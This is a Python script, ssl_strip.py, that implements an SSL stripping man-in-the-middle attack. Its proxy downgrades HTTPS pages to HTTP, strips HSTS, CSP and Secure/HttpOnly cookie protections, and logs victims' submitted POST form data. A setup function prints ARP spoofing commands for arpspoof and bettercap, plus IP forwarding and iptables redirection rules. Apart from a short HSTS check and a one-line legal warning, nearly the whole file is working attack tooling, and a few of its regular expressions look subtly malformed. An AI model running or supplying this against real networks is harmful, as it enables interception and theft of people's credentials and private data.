#!/usr/bin/env python3
"""
ssl_strip.py - SSL Stripping Attack

This script implements an SSL stripping attack to downgrade HTTPS to HTTP
and capture sensitive data in transit.
"""

import socket
import threading
import re
import urllib.parse
import argparse
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import requests
import ssl
import sys # Import sys for potential exit codes

class SSLStripHandler(BaseHTTPRequestHandler):
    """
    Custom HTTP request handler for the SSL stripping proxy.
    It intercepts HTTP requests, makes them over HTTPS to the real target,
    and then strips HTTPS references from the response before sending it back
    to the client over HTTP.
    """
    
    # Store captured data at the class level
    _captured_data_store = []
    # Target host needs to be set before handler is used
    target_host = None

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        """Override to control logging - suppress default HTTP server logs."""
        pass
    
    def do_GET(self):
        """Handle GET requests."""
        self.handle_request('GET')
    
    def do_POST(self):
        """Handle POST requests."""
        self.handle_request('POST')
    
    def handle_request(self, method):
        """Handle HTTP requests, proxy to HTTPS, and strip SSL from response."""
        try:
            # Get the original request path and headers
            path = self.path
            headers = dict(self.headers)
            
            # Read POST data if present
            post_data = None
            if method == 'POST' and 'content-length' in headers:
                try:
                    content_length = int(headers.get('content-length', 0))
                    if content_length > 0:
                        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
                        
                        # Log captured form data
                        if post_data:
                            print(f"[CAPTURED] POST data from {self.client_address[0]} for {path}: {post_data}")
                            self.add_captured_data({
                                'type': 'POST',
                                'client': self.client_address[0],
                                'path': path,
                                'data': post_data,
                                'time': time.strftime('%Y-%m-%d %H:%M:%S')
                            })
                except Exception as e:
                    print(f"[ERROR] Failed to read POST data: {e}")
                    post_data = None # Reset post_data if there's an error
            
            # Construct the target URL over HTTPS
            target_url = urllib.parse.urljoin(f"https://{self.target_host}", path)
            
            # Prepare headers for the upstream HTTPS request
            upstream_headers = {}
            for key, value in headers.items():
                # Exclude hop-by-hop headers and modify Host
                if key.lower() not in ['host', 'connection', 'proxy-connection', 'keep-alive', 'transfer-encoding']:
                    upstream_headers[key] = value
            
            upstream_headers['Host'] = self.target_host # Ensure correct Host header for target
            
            # Make the upstream request to the real target over HTTPS
            response = None
            try:
                if method == 'GET':
                    response = requests.get(target_url, headers=upstream_headers, verify=False, timeout=15, allow_redirects=False)
                else: # POST
                    response = requests.post(target_url, headers=upstream_headers, data=post_data.encode('utf-8') if post_data else None, verify=False, timeout=15, allow_redirects=False)
            except requests.exceptions.RequestException as e:
                print(f"[ERROR] Upstream request to {target_url} failed: {e}")
                self.send_error(502, f"Bad Gateway: Could not connect to target {self.target_host}")
                return

            # Send response status code back to client
            self.send_response(response.status_code)
            
            # Process response headers and content
            content = response.text # Get content as text
            
            # Perform SSL stripping on the content
            content = self.strip_ssl_from_content(content)
            
            # Send headers back to client, modifying as necessary
            for key, value in response.headers.items():
                # Filter out headers that might cause issues or reveal proxying
                if key.lower() not in ['content-length', 'transfer-encoding', 'connection', 'strict-transport-security', 'content-security-policy', 'x-frame-options']:
                    # Modify Location header for redirects if it points to HTTPS
                    if key.lower() == 'location' and value.startswith('https://'):
                        value = value.replace('https://', 'http://', 1)
                        print(f"[STRIPPED] Modified redirect Location header to: {value}")
                    self.send_header(key, value)
            
            # Set the Content-Length header for the modified content
            self.send_header('Content-Length', len(content.encode('utf-8')))
            self.end_headers()
            
            # Send the modified content to the client
            self.wfile.write(content.encode('utf-8'))
            
        except Exception as e:
            print(f"[ERROR] Request handling error: {e}")
            self.send_error(500, f"Internal Server Error: {e}")

    def strip_ssl_from_content(self, content):
        """Remove HTTPS references and security headers from HTML content."""
        try:
            # Replace https:// with http:// in links, scripts, images, etc.
            content = re.sub(r'https://', 'http://', content, flags=re.IGNORECASE)
            
            # Replace secure form actions (action="https://...)
            content = re.sub(
                r'<form([^>]?)action=["\']https://([^"\']?)["\']',
                r'<form\1action="http://\2"',
                content,
                flags=re.IGNORECASE
            )
            
            # Remove secure cookie flags (e.g., "; Secure")
            content = re.sub(r';\s*secure', '', content, flags=re.IGNORECASE)
            content = re.sub(r';\s*httponly', '', content, flags=re.IGNORECASE) # HttpOnly is not directly related to SSL, but often seen with Secure

            # Remove Content-Security-Policy (CSP) meta tags
            content = re.sub(
                r'<meta[^>]http-equiv=["\']Content-Security-Policy["\'][^>]>',
                '',
                content,
                flags=re.IGNORECASE
            )
            
            # Remove HTTP Strict Transport Security (HSTS) meta tags
            content = re.sub(
                r'<meta[^>]http-equiv=["\']Strict-Transport-Security["\'][^>]>',
                '',
                content,
                flags=re.IGNORECASE
            )
            
            # Remove upgrade-insecure-requests directive from CSP (if present in HTML)
            content = re.sub(r"upgrade-insecure-requests", "", content, flags=re.IGNORECASE)

            return content
            
        except Exception as e:
            print(f"[ERROR] Content stripping error: {e}")
            return content

    @classmethod
    def add_captured_data(cls, data_item):
        """Adds captured data to the shared store."""
        cls._captured_data_store.append(data_item)

    @classmethod
    def get_captured_data(cls):
        """Returns the shared captured data store."""
        return cls._captured_data_store

class SSLStripAttack:
    def __init__(self, target_host, listen_port=8080):
        self.target_host = target_host
        self.listen_port = listen_port
        self.httpd = None # To hold the HTTP server instance
        
    def start_server(self):
        """Start the SSL stripping proxy server."""
        print(f"[INFO] Starting SSL Strip attack against {self.target_host}...")
        print(f"[INFO] Listening on port {self.listen_port}.")
        print(f"[ATTACK] All HTTPS traffic redirected to this proxy will be downgraded to HTTP.")
        print(f"[INFO] Configure your client/network to redirect HTTP/HTTPS traffic to this proxy.")
        
        # Set the target host for the handler class
        SSLStripHandler.target_host = self.target_host
        
        try:
            self.httpd = HTTPServer(('0.0.0.0', self.listen_port), SSLStripHandler)
            print(f"[INFO] SSL Strip proxy listening on port {self.listen_port}.")
            self.httpd.serve_forever() # This blocks until server is shut down
        except socket.error as e:
            print(f"[ERROR] Could not bind to port {self.listen_port}: {e}. Is it already in use?")
            return False
        except KeyboardInterrupt:
            print("\n[INFO] Stopping SSL Strip attack due to user interrupt.")
        except Exception as e:
            print(f"[ERROR] SSL Strip server error: {e}")
        finally:
            if self.httpd:
                self.httpd.server_close()
                print("[INFO] SSL Strip proxy stopped.")
            self.show_captured_data() # Display captured data on shutdown
        return True # Server started and ran, even if interrupted
    
    def show_captured_data(self):
        """Display captured sensitive data to stdout."""
        captured_data = SSLStripHandler.get_captured_data()
        if not captured_data:
            print("[INFO] No sensitive data captured during this session.")
            return
        
        print("\n" + "="*50)
        print("CAPTURED SENSITIVE DATA SUMMARY")
        print("="*50)
        
        for i, item in enumerate(captured_data):
            print(f"\n--- Captured Item {i+1} ---")
            print(f"Time: {item['time']}")
            print(f"Client: {item['client']}")
            print(f"Path: {item['path']}")
            print(f"Data Preview (first 500 chars):")
            print("-" * 30)
            print(item['data'][:500])
            if len(item['data']) > 500:
                print("... (truncated)")
            print("-" * 30)
        print("\n[INFO] End of captured data summary.")
    
    def test_ssl_redirect(self):
        """
        Test if target redirects HTTP to HTTPS and checks for HSTS.
        A redirect from HTTP to HTTPS indicates vulnerability to SSL stripping.
        Presence of HSTS header indicates protection.
        """
        print(f"[TEST] Testing {self.target_host} for HTTP->HTTPS redirects and HSTS presence...")
        
        try:
            # Try HTTP connection to the target
            # We use allow_redirects=False to manually check for redirects
            response = requests.get(f"http://{self.target_host}", allow_redirects=False, timeout=10)
            
            # Check for HTTP to HTTPS redirect (3xx status codes with Location header)
            if response.status_code in [301, 302, 307, 308]:
                location = response.headers.get('location', '')
                if location.startswith('https://'):
                    print(f"[VULNERABLE] HTTP redirects to HTTPS: {location}")
                    print("[VULNERABLE] Target is susceptible to SSL stripping attack if no HSTS is present!")
                    # Check for HSTS after detecting redirect
                    hsts = response.headers.get('strict-transport-security')
                    if hsts:
                        print(f"[INFO] HSTS header found: {hsts}")
                        print("[PROTECTED] HSTS may prevent SSL stripping for returning users.")
                        return False # HSTS protects against stripping for returning users
                    else:
                        print("[WARNING] No HSTS header found. SSL stripping is highly likely for first-time users.")
                        return True # Vulnerable if no HSTS
            
            # If no redirect, check for HSTS on the initial HTTP response
            hsts = response.headers.get('strict-transport-security')
            if hsts:
                print(f"[INFO] HSTS header found: {hsts}")
                print("[PROTECTED] HSTS may prevent SSL stripping even without a direct HTTP->HTTPS redirect.")
                return False # HSTS protects
            
            print("[INFO] No HTTP to HTTPS redirect found, and no HSTS header detected.")
            print("[SECURE] Target may not be vulnerable to typical SSL stripping if it does not redirect to HTTPS.")
            return False # Not vulnerable to this specific redirect-based stripping
            
        except requests.exceptions.ConnectionError:
            print(f"[ERROR] Could not connect to {self.target_host} on HTTP (port 80).")
            return False
        except requests.exceptions.Timeout:
            print(f"[ERROR] Connection to {self.target_host} timed out during HTTP test.")
            return False
        except Exception as e:
            print(f"[ERROR] Error during SSL redirect test: {e}")
            return False

def attack_setup_instructions(victim_ip=None, attacker_ip=None, listen_port=8080):
    """Provide instructions for DNS spoofing and iptables setup to stdout."""
    print("\n" + "="*50)
    print("SSL STRIP ATTACK SETUP INSTRUCTIONS")
    print("="*50)
    print("To perform a complete SSL strip attack, you typically need to:")
    print()
    print("1.  *Position yourself as a man-in-the-middle* (e.g., on the same network as the victim).")
    print("2.  *Enable IP Forwarding on your attacker machine:*")
    print("    sudo sysctl -w net.ipv4.ip_forward=1")
    print()
    print("3.  *Redirect victim's traffic to your proxy.* This can be done via ARP Spoofing:")
    print(f"    (Assumes victim IP: {victim_ip if victim_ip else '<VICTIM_IP>'}, Attacker IP: {attacker_ip if attacker_ip else '<ATTACKER_IP>'})")
    print("    * Using `arpspoof` (from dsniff package):")
    print(f"        sudo arpspoof -i <your_interface> -t {victim_ip if victim_ip else '<VICTIM_IP>'} <gateway_ip>")
    print(f"        sudo arpspoof -i <your_interface> -t <gateway_ip> {victim_ip if victim_ip else '<VICTIM_IP>'}")
    print("    * Using `bettercap` (recommended for comprehensive MITM):")
    print("        Create a caplet file (e.g., `ssl_mitm.cap`):")
    print("        ```")
    print("        set net.sniff.verbose true")
    print(f"        set arp.spoof.targets {victim_ip if victim_ip else '<VICTIM_IP>'}")
    print("        set arp.spoof.internal true")
    print("        set http.proxy.sslstrip true")
    print("        set http.proxy.sslstrip.engine true")
    print("        set http.proxy.sslstrip.log sslstrip.log")
    print("        set http.proxy.verbose true")
    print("        http.proxy on")
    print("        arp.spoof on")
    print("        set net.sniff.output mitm_capture.pcap")
    print("        net.sniff on")
    print("        ```")
    print(f"        Then run: sudo bettercap -iface <your_interface> -caplet ssl_mitm.cap")
    print()
    print(f"4.  *Start this SSL strip proxy script on your attacker machine (listening on port {listen_port}).*")
    print("    python3 ssl_strip.py <target_hostname_or_ip> -p {listen_port} --victim-ip {victim_ip if victim_ip else '<VICTIM_IP>'} --attacker-ip {attacker_ip if attacker_ip else '<ATTACKER_IP>'}")
    print()
    print(f"5.  *Use iptables to redirect HTTP and HTTPS traffic to your proxy's listen port ({listen_port}).*")
    print("    * Redirect HTTP (port 80) traffic to your proxy:")
    print(f"        sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {listen_port}")
    print("    * Redirect HTTPS (port 443) traffic to your proxy (this will cause certificate warnings on client):")
    print(f"        sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {listen_port}")
    print("\nLEGAL WARNING: Only use these techniques on networks you own or have explicit, written permission to test!")
    print("="*50 + "\n")

def run_ssl_strip_attack(target, port=8080, test_mode=False, setup=False, victim_ip=None, attacker_ip=None):
    """
    Main function to run the SSL Stripping Attack.
    Designed to be called by app.py.
    """
    print("SSL Stripping Attack Tool")
    print("=========================")
    print(f"Target: {target}")
    print(f"Listen Port: {port}")
    print(f"Mode: {'Test/Detection Only' if test_mode else 'Full Attack (Proxy)'}")
    if victim_ip: print(f"Victim IP (for setup instructions): {victim_ip}")
    if attacker_ip: print(f"Attacker IP (for setup instructions): {attacker_ip}")
    print("=========================\n")
    
    if setup:
        attack_setup_instructions(victim_ip, attacker_ip, port)
        return True # Indicate success for showing setup instructions

    attacker = SSLStripAttack(target, port)
    
    if test_mode:
        is_vulnerable = attacker.test_ssl_redirect()
        if is_vulnerable:
            print("\n[VULNERABLE] Target is susceptible to SSL stripping. Use without --test flag to start attack.")
            print("[INFO] Use --setup flag for attack setup instructions.")
            return True # Indicate vulnerability detected
        else:
            print("\n[SECURE] Target appears secure against typical SSL stripping attacks (e.g., due to HSTS or no HTTP->HTTPS redirect).")
            return False # Indicate not vulnerable
    else:
        print("[INFO] Testing for SSL redirect and HSTS first before starting SSL strip proxy...")
        is_vulnerable = attacker.test_ssl_redirect()
        
        if is_vulnerable:
            print("\n[ATTACK] Target appears VULNERABLE! Starting SSL strip server...")
            time.sleep(2) # Give a moment for message to be seen
            return attacker.start_server() # Start server and return its success status
        else:
            print("\n[INFO] Target may not be vulnerable to SSL stripping. Attack proxy will not start.")
            # In automated mode, if not vulnerable, we don't proceed with full attack.
            return False # Not vulnerable, so no attack initiated

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SSL Stripping Attack Tool')
    parser.add_argument('target', help='Target hostname or IP')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Listen port (default: 8080)')
    parser.add_argument('-t', '--test', action='store_true', help='Test for vulnerability only')
    parser.add_argument('--setup', action='store_true', help='Show setup instructions')
    parser.add_argument('--victim-ip', help='IP address of the victim (for setup instructions)')
    parser.add_argument('--attacker-ip', help='IP address of the attacker machine (for setup instructions)')
    
    args = parser.parse_args()
    
    # Call the main attack function with parsed arguments
    success = run_ssl_strip_attack(
        target=args.target,
        port=args.port,
        test_mode=args.test,
        setup=args.setup,
        victim_ip=args.victim_ip,
        attacker_ip=args.attacker_ip
    )
    
    if not success:
        sys.exit(1) # Exit with an error code if the attack/test failed
    sys.exit(0) # Exit successfully

